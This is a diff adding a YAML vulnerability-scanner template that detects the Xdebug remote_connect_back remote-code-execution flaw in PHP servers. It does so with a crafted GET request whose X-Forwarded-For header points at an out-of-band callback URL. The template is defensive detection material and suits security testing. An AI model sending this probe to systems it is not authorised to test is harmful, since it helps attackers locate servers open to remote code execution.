@@ -1,0 +1,39 @@
+id: php-xdebug-rce
+
+info:
+  name: Xdebug remote code execution via xdebug.remote_connect_back
+  author: pwnhxl
+  severity: high
+  description: |
+    The XDebug extension <= v2.6.0 for PHP is designed to expand the debugging capabilities of developers, including the ability to perform remote debugging. A misconfigured server, with ‘xdebug.remote_connect_back’ enabled, exposed to the internet could allow an unauthenticated remote attacker to trigger a debugging session using any IP via a simple web request. With a remote debugging session established, the attacker effectively has remote code execution (RCE) capabilities with which to establish persistence, exfiltrate data, or launch further attacks against the system or network.
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce
+    - https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/
+    - https://paper.seebug.org/397/
+    - https://github.com/D3Ext/XDEBUG-Exploit
+  tags: oast,rce,vulhub,php,debug,xdebug
+  metadata:
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /?XDEBUG_SESSION_START={{randstr}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: {{interactsh-url}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: header
+        words:
+          - 'Set-Cookie: XDEBUG_SESSION={{randstr}}'
+
+      - type: status
+        status:
+          - 200
